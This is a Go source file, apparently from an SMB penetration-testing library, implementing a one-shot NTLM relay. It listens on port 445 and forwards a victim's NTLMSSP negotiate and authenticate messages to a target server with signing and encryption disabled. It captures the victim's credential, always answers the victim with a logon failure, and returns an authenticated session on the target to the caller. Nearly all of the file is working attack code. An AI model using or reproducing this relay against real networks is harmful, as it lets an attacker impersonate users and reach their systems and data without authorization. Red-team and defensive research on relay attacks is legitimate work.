// MIT License
//
// Copyright (c) 2026 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package relay

import (
	"context"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/server"
)

// ClientConfig configures a one-shot RelayClient.
type ClientConfig struct {
	// ListenAddr is the local TCP address the relay listens on. Defaults to
	// ":445" if empty. The listener is closed after a single successful
	// relay (or on timeout / error).
	ListenAddr string

	// Target is the upstream server. Accepts either bare "host:port" (assumed
	// SMB) or scheme-prefixed "smb://host[:port]". One-shot client only
	// supports SMB upstream — for cross-protocol relay use RelayServer.
	Target string

	// UpstreamOptions configures the upstream *smb.Connection. Sensible
	// relay defaults (ManualLogin=true, Dialects=DialectsSMB2Only,
	// DisableSigning=true, Encryption=EncryptionDisabled) are forced on regardless
	// of caller settings.
	UpstreamOptions smb.Options

	// ListenerConfig configures the inbound smb/server listener. If
	// Authenticator / OnSessionSetup are set the relay will overwrite them.
	// SigningRequired is forced to false. MaxDialect defaults to
	// smb.DialectSmb_2_1 if zero.
	ListenerConfig server.ServerConfig

	// OnCredentialCaptured fires once after the relay has captured the
	// inbound AUTHENTICATE message and forwarded it upstream, regardless of
	// whether the upstream accepted it.
	OnCredentialCaptured func(c *server.Conn, cred *Credential)

	// OnUpstreamReady fires immediately before RelayClient returns, with
	// the same *smb.Connection.
	OnUpstreamReady func(*smb.Connection)

	// Logger is the listener's logger.
	Logger server.Logger

	// Timeout aborts the listener if no successful relay completes before
	// it elapses. Defaults to 120s.
	Timeout time.Duration

	// StripMechListMIC drops the inbound MechListMIC instead of passing it
	// through. Pass-through is the default.
	StripMechListMIC bool
}

// RelayClient runs a one-shot relay listener: it accepts a single inbound
// SMB2 SessionSetup, forwards both NTLMSSP legs to cfg.Target, and returns
// the resulting authenticated *smb.Connection along with the captured
// credential. The listener is closed before the function returns.
//
// The relayed (inbound) client always receives STATUS_LOGON_FAILURE — it is
// not the consumer of the relay; the caller of RelayClient is.
func RelayClient(cfg ClientConfig) (*smb.Connection, *Credential, error) {
	logger := cfg.Logger
	if logger == nil {
		logger = log
	}
	if cfg.Target == "" {
		return nil, nil, fmt.Errorf("ClientConfig.Target is required")
	}
	if cfg.ListenAddr == "" {
		cfg.ListenAddr = ":445"
	}
	rawTarget := cfg.Target
	if !strings.Contains(rawTarget, "://") {
		if !strings.ContainsRune(rawTarget, ':') {
			log.Infoln("relay target did not specify a port so falling back to 445")
			rawTarget += ":445"
		}
		rawTarget = "smb://" + rawTarget
	}
	target, err := ParseTarget(rawTarget)
	if err != nil {
		return nil, nil, err
	}
	if target.Protocol != ProtoSMB {
		return nil, nil, fmt.Errorf("RelayClient only supports smb:// targets, got %s", target.Protocol)
	}
	if cfg.Timeout == 0 {
		cfg.Timeout = 120 * time.Second
	}
	if cfg.ListenerConfig.MaxDialect == 0 {
		cfg.ListenerConfig.MaxDialect = smb.DialectSmb_2_1
	}
	cfg.ListenerConfig.SigningRequired = false

	type result struct {
		up   *smb.Connection
		cred *Credential
		err  error
	}
	done := make(chan result, 1)
	deliver := func(r result) {
		select {
		case done <- r:
		default:
		}
	}

	var (
		mu     sync.Mutex
		fwdsBy = map[*server.Conn]*smbForwarder{}
	)

	cfg.ListenerConfig.OnSessionSetup = func(c *server.Conn, s *server.Session, blob []byte, stage server.SessionSetupStage) (*server.Status, error) {
		mu.Lock()
		f := fwdsBy[c]
		mu.Unlock()

		switch stage {
		case server.SessionSetupStageNegotiate:
			if f != nil {
				f.Close()
			}
			init, err := unwrapNegInit(blob)
			if err != nil {
				deliver(result{err: err})
				return nil, err
			}
			nf, err := newSMBForwarder(target, cfg.UpstreamOptions, logger)
			if err != nil {
				deliver(result{err: err})
				return nil, err
			}
			chal, err := nf.Negotiate(init.Data.MechToken)
			if err != nil {
				nf.Close()
				deliver(result{err: err})
				return nil, err
			}
			out, err := wrapNegRespAcceptIncomplete(chal)
			if err != nil {
				nf.Close()
				deliver(result{err: err})
				return nil, err
			}
			mu.Lock()
			fwdsBy[c] = nf
			mu.Unlock()
			return &server.Status{
				Code:         smb.StatusMoreProcessingRequired,
				SecurityBlob: out,
			}, nil

		case server.SessionSetupStageAuthenticate:
			if f == nil {
				return nil, fmt.Errorf("SessionSetup2 with no prior SessionSetup1 on this conn")
			}
			resp, err := unwrapNegResp(blob)
			if err != nil {
				f.Close()
				mu.Lock()
				delete(fwdsBy, c)
				mu.Unlock()
				deliver(result{err: err})
				return &server.Status{Code: smb.StatusLogonFailure}, nil
			}
			mic := resp.MechListMIC
			if cfg.StripMechListMIC {
				mic = nil
			}
			cred, upstreamStatus, err := f.Authenticate(c.RemoteAddr, resp.ResponseToken, mic)
			if err != nil {
				f.Close()
				mu.Lock()
				delete(fwdsBy, c)
				mu.Unlock()
				c.RemoveSession(s.ID)
				deliver(result{err: err})
				return &server.Status{Code: smb.StatusLogonFailure}, nil
			}
			if cb := cfg.OnCredentialCaptured; cb != nil {
				cb(c, cred)
			}
			if upstreamStatus != smb.StatusOk {
				f.Close()
				mu.Lock()
				delete(fwdsBy, c)
				mu.Unlock()
				c.RemoveSession(s.ID)
				deliver(result{cred: cred, err: fmt.Errorf("upstream rejected auth (status=0x%08x)", upstreamStatus)})
				return &server.Status{Code: smb.StatusLogonFailure}, nil
			}
			up := f.Take()
			mu.Lock()
			delete(fwdsBy, c)
			mu.Unlock()
			authUser := fmtAuthUser(cred)
			up.MarkAuthenticated(authUser)
			deliver(result{up: up, cred: cred})
			c.RemoveSession(s.ID)
			return &server.Status{Code: smb.StatusLogonFailure}, nil
		}
		return nil, nil
	}

	l, err := net.Listen("tcp", cfg.ListenAddr)
	if err != nil {
		return nil, nil, fmt.Errorf("listen %s: %w", cfg.ListenAddr, err)
	}
	srv := &server.Server{Config: &cfg.ListenerConfig}
	serveDone := make(chan error, 1)
	go func() { serveDone <- srv.Serve(l) }()

	logger.Noticef("listening on %s, target=%s, timeout=%s", l.Addr(), target.String(), cfg.Timeout)

	var (
		out  *smb.Connection
		cr   *Credential
		rerr error
	)
	select {
	case r := <-done:
		out = r.up
		cr = r.cred
		rerr = r.err
	case <-time.After(cfg.Timeout):
		rerr = fmt.Errorf("timeout after %s with no successful relay", cfg.Timeout)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	if sherr := srv.Shutdown(ctx); sherr != nil {
		log.Debugf("listener shutdown: %v", sherr)
	}
	cancel()
	<-serveDone

	mu.Lock()
	for c, f := range fwdsBy {
		f.Close()
		delete(fwdsBy, c)
	}
	mu.Unlock()

	if rerr != nil {
		if out != nil {
			out.Close()
		}
		return nil, cr, rerr
	}
	if out == nil {
		return nil, cr, fmt.Errorf("listener closed without a successful relay")
	}
	if cb := cfg.OnUpstreamReady; cb != nil {
		cb(out)
	}
	return out, cr, nil
}

// fmtAuthUser produces the same "DOMAIN\user" string the legacy relay used.
func fmtAuthUser(cred *Credential) string {
	if cred == nil {
		return ""
	}
	if cred.Domain == "" {
		return cred.Username
	}
	return cred.Domain + "\\" + cred.Username
}
